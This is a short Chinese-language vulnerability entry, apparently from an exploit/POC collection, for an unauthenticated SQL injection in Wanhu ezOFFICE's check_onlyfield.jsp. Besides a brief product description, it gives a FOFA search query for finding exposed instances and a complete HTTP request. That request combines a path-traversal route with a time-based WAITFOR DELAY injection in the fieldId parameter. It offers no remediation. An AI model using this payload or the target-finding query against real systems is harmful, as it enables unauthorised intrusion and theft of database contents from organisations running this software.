## 万户 ezOFFICE check_onlyfield.jsp SQL注入

>万户ezOFFICE协同管理平台是一个综合信息基础应用平台分为企业版和政务版。解决方案由五大应用、两个支撑平台组成，分别为知识管理、工作流程、沟通交流、辅助办公、集成解决方案及应用支撑平台、基础支撑平台。

## 简介

万户ezOFFICE check_onlyfield.jsp未对用户输入的SQL语句进行过滤或验证导致出现SQL注入漏洞，未经身份验证的攻击者可以利用此漏洞获取数据库敏感信息。

## 漏洞类型

SQL注入

## 网络绘测

### fofa

```
app="ezOFFICE协同管理平台"
```

## POC

```http
GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../platform/custom/custom_form/run/checkform/check_onlyfield.jsp?fieldId=1)WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
Host: host
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

